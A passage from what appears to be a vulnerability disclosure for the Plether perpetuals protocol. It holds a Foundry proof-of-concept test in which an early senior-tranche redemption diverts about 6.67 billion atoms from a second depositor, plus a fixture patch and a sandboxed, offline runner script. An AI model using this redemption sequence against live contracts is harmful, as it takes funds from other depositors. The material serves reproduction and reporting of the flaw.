        emit log_named_uint("CONTROL_PROJECTED_SENIOR", control.projectedSenior);
        emit log_named_uint("ATTACK_PROJECTED_SENIOR", attack.projectedSenior);
        emit log_named_uint("CONTROL_PROJECTED_JUNIOR", control.projectedJunior);
        emit log_named_uint("ATTACK_PROJECTED_JUNIOR", attack.projectedJunior);
        emit log_named_uint("ATTACK_HWM_AFTER_A", attack.hwmAfterA);
        emit log_named_uint("CONTROL_B_QUOTE_BEFORE_RECOVERY", control.bQuoteBefore);
        emit log_named_uint("ATTACK_B_QUOTE_BEFORE_RECOVERY", attack.bQuoteBefore);
        emit log_named_uint("CONTROL_B_PAID", control.bPaid);
        emit log_named_uint("ATTACK_B_PAID", attack.bPaid);
        emit log_named_uint("CONTROL_A_LATER_PAID", control.aLaterPaid);
        emit log_named_uint("ATTACK_A_LATER_PAID", attack.aLaterPaid);
        emit log_named_uint("CONTROL_A_JUNIOR_PAID", control.aJuniorPaid);
        emit log_named_uint("ATTACK_A_JUNIOR_PAID", attack.aJuniorPaid);
        emit log_named_uint("CONTROL_A_FINAL_WALLET", control.aWalletFinal);
        emit log_named_uint("ATTACK_A_FINAL_WALLET", attack.aWalletFinal);
        emit log_named_uint("CONTROL_A_FINAL_QUOTE", control.aQuoteFinal);
        emit log_named_uint("ATTACK_A_FINAL_QUOTE", attack.aQuoteFinal);
        emit log_named_uint("CONTROL_B_FINAL_WALLET", control.bWalletFinal);
        emit log_named_uint("ATTACK_B_FINAL_WALLET", attack.bWalletFinal);
        emit log_named_uint("CONTROL_B_FINAL_QUOTE", control.bQuoteFinal);
        emit log_named_uint("ATTACK_B_FINAL_QUOTE", attack.bQuoteFinal);
        emit log_named_uint("CONTROL_D_FINAL_WALLET", control.donorWalletFinal);
        emit log_named_uint("ATTACK_D_FINAL_WALLET", attack.donorWalletFinal);
        emit log_named_uint("CONTROL_D_FINAL_CREDIT", control.donorCreditFinal);
        emit log_named_uint("ATTACK_D_FINAL_CREDIT", attack.donorCreditFinal);
        emit log_named_uint("CONTROL_D_FINAL_CLAIM", control.donorClaimFinal);
        emit log_named_uint("ATTACK_D_FINAL_CLAIM", attack.donorClaimFinal);
        emit log_named_uint("CONTROL_POOL_RAW_FINAL", control.poolRawFinal);
        emit log_named_uint("ATTACK_POOL_RAW_FINAL", attack.poolRawFinal);
        emit log_named_uint("CONTROL_OWNER_QUOTE_FINAL", control.ownerQuoteFinal);
        emit log_named_uint("ATTACK_OWNER_QUOTE_FINAL", attack.ownerQuoteFinal);
        emit log_named_uint("CONTROL_TREASURY_CREDIT_FINAL", control.treasuryCreditFinal);
        emit log_named_uint("ATTACK_TREASURY_CREDIT_FINAL", attack.treasuryCreditFinal);
        emit log_named_uint("CONTROL_KEEPER_CREDIT_FINAL", control.keeperCreditFinal);
        emit log_named_uint("ATTACK_KEEPER_CREDIT_FINAL", attack.keeperCreditFinal);
        emit log_named_uint("CONTROL_FINAL_TIME", control.finalTime);
        emit log_named_uint("ATTACK_FINAL_TIME", attack.finalTime);
        assertEq(attack.aEarlyPaid, 10, "A owns early ten atoms");
        assertEq(control.aEarlyPaid, 0, "control A stays Senior");
        assertEq(control.donorRevenue, attack.donorRevenue, "same D funded trading revenue");
        assertEq(control.donorWalletFinal, attack.donorWalletFinal, "same D wallet");
        assertEq(control.donorCreditFinal, attack.donorCreditFinal, "same D credit");
        assertEq(control.donorClaimFinal, attack.donorClaimFinal, "same D claim");
        assertEq(control.finalTime, attack.finalTime, "same final time");
        assertGt(control.bPaid, attack.bPaid, "B later cash falls after A exit");
        assertGt(attack.aWalletFinal + attack.aQuoteFinal,
            control.aWalletFinal + control.aQuoteFinal, "A coalition gains");
        assertEq(control.bPaid - attack.bPaid, 6_667_517_310, "B funded cash diversion in atoms");
        assertEq(control.aQuoteFinal, 0, "control A has no residual LP quote");
        assertEq(attack.aQuoteFinal, 0, "attack A has no residual LP quote");
        assertEq(attack.aWalletFinal - control.aWalletFinal, 6_665_605_065, "A wallet gain in atoms");
        assertEq(attack.poolRawFinal - control.poolRawFinal, 1_912_245, "Pool residual in atoms");
        assertEq(
            attack.aWalletFinal - control.aWalletFinal + attack.poolRawFinal - control.poolRawFinal,
            control.bPaid - attack.bPaid,
            "B loss equals A gain plus Pool residual"
        );
    }

    function _branch(bool attack) private returns (Outcome memory out) {
        (uint256 firstEpoch,) = seniorVault.getRequestEpochWindow();
        if (attack) {
            uint256 g0 = gasleft();
            out.aEarlyPaid = _redeemSenior(SENIOR_LP);
            emit log_named_uint("ATTACK_A_EXIT_GAS_INCL_KEEPER_SETTLE", g0 - gasleft());
        } else {
            vm.warp(pool.lpEpochStart(firstEpoch));
            _mark(HIGH);
        }
        out.hwmAfterA = pool.seniorHighWaterMark();
        out.bQuoteBefore = seniorVault.estimateRedeemAssets(seniorVault.balanceOf(SECOND_SENIOR));
        uint256 cashBeforeD = pool.rawAssets();
        _fundTrader(DONOR, 80_000e6 * SCALE);
        for (uint256 i; i < 40; ++i) {
            _executeFor(DONOR, CfdTypes.Side.SHORT, false, 3_000e18 * SCALE, 5_000e6 * SCALE, HIGH, 2001 + 2*i);
            _executeFor(DONOR, CfdTypes.Side.SHORT, true, 3_000e18 * SCALE, 0, LOW, 2002 + 2*i);
        }
        out.donorRevenue = pool.rawAssets() - cashBeforeD;
        (out.projectedSenior, out.projectedJunior,,) = pool.getPendingTrancheState();
        out.bPaid = _redeemSenior(SECOND_SENIOR);
        (uint256 laterSeniorEpoch,) = seniorVault.getRequestEpochWindow();
        if (seniorVault.balanceOf(SENIOR_LP) > 0) {
            out.aLaterPaid = _redeemSenior(SENIOR_LP);
        } else {
            vm.warp(pool.lpEpochStart(laterSeniorEpoch));
            _mark(HIGH);
        }
        out.aJuniorPaid = _redeemJunior(JUNIOR_LP);
        uint256 dCredit = clearinghouse.balanceAssets(DONOR);
        if (dCredit > 0) {
            vm.prank(DONOR);
            clearinghouse.withdraw(DONOR, dCredit);
        }
        out.donorWalletFinal = settlementToken.balanceOf(DONOR);
        out.donorCreditFinal = clearinghouse.balanceAssets(DONOR);
        out.donorClaimFinal = engine.traderClaimBalanceAssets(DONOR);
        out.aWalletFinal = settlementToken.balanceOf(SENIOR_LP) + settlementToken.balanceOf(JUNIOR_LP);
        out.aQuoteFinal =
            seniorVault.estimateRedeemAssets(seniorVault.balanceOf(SENIOR_LP)) +
            juniorVault.estimateRedeemAssets(juniorVault.balanceOf(JUNIOR_LP));
        out.bWalletFinal = settlementToken.balanceOf(SECOND_SENIOR);
        out.bQuoteFinal = seniorVault.estimateRedeemAssets(seniorVault.balanceOf(SECOND_SENIOR));
        out.poolRawFinal = pool.rawAssets();
        out.ownerQuoteFinal =
            seniorVault.estimateRedeemAssets(seniorVault.balanceOf(address(this))) +
            juniorVault.estimateRedeemAssets(juniorVault.balanceOf(address(this)));
        out.treasuryCreditFinal = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        out.keeperCreditFinal = clearinghouse.balanceAssets(KEEPER);
        out.finalTime = vm.getBlockTimestamp();
    }

    function _redeemJunior(address account) private returns (uint256 paid) {
        uint256 shares = juniorVault.balanceOf(account);
        vm.prank(account);
        uint256 id = juniorVault.requestRedeem(shares, account, account);
        if (vm.getBlockTimestamp() < pool.lpEpochStart(id)) vm.warp(pool.lpEpochStart(id));
        bytes[] memory tick = _mark(HIGH);
        vm.prank(KEEPER);
        router.settleLpEpoch(tick);
        uint256 funded = juniorVault.claimableRedeemRequest(id, account);
        if (funded > 0) {
            vm.prank(account);
            paid = juniorVault.claimRedeem(id, funded, account, account);
        }
        uint256 refunded = juniorVault.refundableRedeemRequest(id, account);
        if (refunded > 0) {
            vm.prank(account);
            juniorVault.claimRedeemRefund(id, account, account);
        }
    }
    function _redeemSenior(address account) private returns (uint256 paid) {
        uint256 shares = seniorVault.balanceOf(account);
        vm.prank(account);
        uint256 id = seniorVault.requestRedeem(shares, account, account);
        if (vm.getBlockTimestamp() < pool.lpEpochStart(id)) vm.warp(pool.lpEpochStart(id));
        bytes[] memory tick = _mark(HIGH);
        vm.prank(KEEPER);
        router.settleLpEpoch(tick);
        uint256 funded = seniorVault.claimableRedeemRequest(id, account);
        assertGt(funded, 0, "positive Senior funding");
        vm.prank(account);
        paid = seniorVault.claimRedeem(id, funded, account, account);
    }

}
```

## Appendix B — six-feed test-fixture patch, `patch_sixfeed_fixture.py`

```python
"""Patch only the copied BasePerpTest in the isolated scratch workspace."""
from pathlib import Path
import sys

path = Path(sys.argv[1])
body = path.read_text()
old_seed = "baseMockPyth.setAllPrices(baseFeedIds, int64(100_000_000), int32(-8), SETUP_TIMESTAMP);"
assert body.count(old_seed) == 1
body = body.replace(old_seed, "_seedSixPrices(1e8, SETUP_TIMESTAMP);")
start = body.index("    function _basePythFeedIds()")
end = body.index("    function _mockHistoricalPublishTime()", start)
replacement = '''    function _basePythFeedIds() internal pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _basePythWeights() internal pure returns (uint256[] memory weights) {
        weights = new uint256[](6);
        weights[0] = 576e15; weights[1] = 136e15; weights[2] = 119e15;
        weights[3] = 91e15; weights[4] = 42e15; weights[5] = 36e15;
    }

    function _basePythBasePrices() internal pure returns (uint256[] memory prices) {
        prices = new uint256[](6);
        prices[0] = 117_500_000; prices[1] = 638_000; prices[2] = 134_480_000;
        prices[3] = 72_880_000; prices[4] = 10_860_000; prices[5] = 126_100_000;
    }

    function _basePythInversions() internal pure returns (bool[] memory inversions) {
        inversions = new bool[](6);
        inversions[1] = true; inversions[3] = true; inversions[4] = true; inversions[5] = true;
    }

    function _sixRawAt(uint256 basketPrice, uint256 i) internal pure returns (int64) {
        uint256[] memory bases = _basePythBasePrices();
        bool[] memory inverted = _basePythInversions();
        uint256 componentUsd = bases[i] * basketPrice / 1e8;
        uint256 raw = inverted[i] ? (1e16 + componentUsd / 2) / componentUsd : componentUsd;
        return SafeCast.toInt64(SafeCast.toInt256(raw));
    }

    function _seedSixPrices(uint256 basketPrice, uint256 time) internal {
        bytes32[] memory ids = _basePythFeedIds();
        for (uint256 i; i < 6; ++i) baseMockPyth.setPrice(ids[i], _sixRawAt(basketPrice, i), int32(-8), time);
    }

    function _mockPythUpdateData() internal returns (bytes[] memory updates) {
        return _mockPythUpdateData(1e8);
    }

    function _mockPythUpdateData(uint256 basketPrice) internal returns (bytes[] memory updates) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory feeds = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            feeds[i] = MockPyth.FeedUpdate({id: ids[i], price: MockPyth.MockPrice({
                price: _sixRawAt(basketPrice, i), conf: 0, expo: -8,
                publishTime: publishTime, prevPublishTime: 0
            })});
        }
        updates = new bytes[](1);
        updates[0] = abi.encode(feeds);
    }

'''
body = body[:start] + replacement + body[end:]
path.write_text(body)
```

## Appendix C — isolated runner, `run_repro.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

# Usage: bash run_repro.sh <pinned_source_root> <offline_toolchain_root> <solc_0.8.35_binary> <new_output_dir>
# Save this script, Appendix A, and Appendix B in the same directory.
if (( $# != 4 )); then
  echo "usage: bash run_repro.sh <pinned_source_root> <offline_toolchain_root> <solc_0.8.35_binary> <new_output_dir>" >&2
  exit 2
fi
source_root="$(realpath "$1")"
toolchain_root="$(realpath "$2")"
solc_bin="$(realpath "$3")"
out="$(realpath -m "$4")"
artifact_dir="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)"
forge_bin="$toolchain_root/bin/forge"
for required in "$artifact_dir/OneAtomP12DonorFollowup.t.sol" "$artifact_dir/patch_sixfeed_fixture.py" "$forge_bin" "$solc_bin"; do
  test -f "$required" || { echo "missing file: $required" >&2; exit 2; }
done
for dependency in forge-std openzeppelin-contracts morpho-blue; do
  test -d "$toolchain_root/deps/$dependency" || { echo "missing offline dependency: $dependency" >&2; exit 2; }
done
test -f "$source_root/packages/perps/foundry.toml" || { echo "not a Plether source checkout" >&2; exit 2; }
test "$(sha256sum "$source_root/packages/perps/src/HousePool.sol" | cut -d' ' -f1)" = \
  57cde380a49f5fa0607fa101e790e64f539b32a52da7baaae520daac0ee40159 || \
  { echo "pinned HousePool.sol hash mismatch" >&2; exit 3; }
if find "$source_root" \( -name .env -o -name '*.key' \) -print -quit | grep -q .; then
  echo "source checkout contains credentials; stop" >&2
  exit 3
fi
mkdir "$out"
scratch="$(mktemp -d /tmp/plether-oneatom-report-XXXXXXXX)"
cleanup() {
  local resolved
  resolved="$(realpath "$scratch")"
  case "$resolved" in /tmp/plether-oneatom-report-*) rm -rf -- "$resolved" ;; *) return 1 ;; esac
}
trap cleanup EXIT

# Only scratch test files are changed. All packages/perps/src contracts remain byte-identical.
cp -a "$source_root/." "$scratch/workspace/"
mkdir -p "$scratch/workspace/lib/forge-std" \
  "$scratch/workspace/lib/openzeppelin-contracts" "$scratch/workspace/lib/morpho-blue"
test_dir="$scratch/workspace/packages/perps/test/perps"
cp "$artifact_dir/OneAtomP12DonorFollowup.t.sol" \
  "$test_dir/spec/trader/OneAtomP12DonorFollowup.t.sol"
python3 "$artifact_dir/patch_sixfeed_fixture.py" "$test_dir/BasePerpTest.sol"
python3 - "$test_dir/BasePerpTest.sol" "$test_dir" <<'PY'
from pathlib import Path
import sys

target = Path(sys.argv[1])
body = target.read_text()
for old, new in [
    ('LegacyOrderRouterHarness router;', 'OrderRouter router;'),
    ('returns (LegacyOrderRouterHarness deployedRouter)', 'returns (OrderRouter deployedRouter)'),
    ('new LegacyOrderRouterHarness(', 'new OrderRouter('),
]:
    assert body.count(old) == 1, old
    body = body.replace(old, new)
target.write_text(body)
keep = {'BasePerpTest.sol', 'OneAtomP12DonorFollowup.t.sol'}
for path in Path(sys.argv[2]).rglob('*.sol'):
    if path.name not in keep:
        path.unlink()
PY

sha256sum \
  "$source_root/packages/perps/src/HousePool.sol" \
  "$source_root/packages/perps/src/OrderRouter.sol" \
  "$source_root/packages/perps/src/CfdEngine.sol" \
  "$source_root/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol" \
  "$artifact_dir/OneAtomP12DonorFollowup.t.sol" \
  "$artifact_dir/patch_sixfeed_fixture.py" \
  "$artifact_dir/run_repro.sh" \
  "$test_dir/BasePerpTest.sol" \
  "$forge_bin" "$solc_bin" "$(command -v bwrap)" > "$out/hashes.txt"
printf 'source_commit=a82d4fefb02768e5b3bddcc97dee371eee24fea8\nrouter=production\nfeeds=6_synthetic_unsigned\nnetwork=unshared\n' > "$out/metadata.txt"

set +e
timeout 900s bwrap --die-with-parent --unshare-user --unshare-pid --unshare-net \
  --ro-bind /usr /usr --ro-bind /lib /lib --ro-bind /lib64 /lib64 \
  --proc /proc --dev /dev --tmpfs /tmp --dir /opt --dir /opt/tools \
  --ro-bind "$forge_bin" /opt/tools/forge \
  --ro-bind "$solc_bin" /opt/tools/solc \
  --bind "$scratch/workspace" /workspace \
  --ro-bind "$toolchain_root/deps/forge-std" /workspace/lib/forge-std \
  --ro-bind "$toolchain_root/deps/openzeppelin-contracts" /workspace/lib/openzeppelin-contracts \
  --ro-bind "$toolchain_root/deps/morpho-blue" /workspace/lib/morpho-blue \
  --chdir /workspace --clearenv --setenv HOME /tmp --setenv PATH /opt/tools:/usr/bin \
  --setenv FOUNDRY_PROFILE default --setenv RAYON_NUM_THREADS 1 \
  /opt/tools/forge test --root packages/perps \
    --match-path test/perps/spec/trader/OneAtomP12DonorFollowup.t.sol \
    --offline --use /opt/tools/solc --threads 1 -vv \
  > "$out/stdout" 2> "$out/stderr"
status=$?
set -e
printf '%s\n' "$status" > "$out/exit"
sha256sum "$out/stdout" "$out/stderr" "$out/exit" >> "$out/hashes.txt"
printf 'oneatom-repro exit=%s\n' "$status"
exit "$status"
```
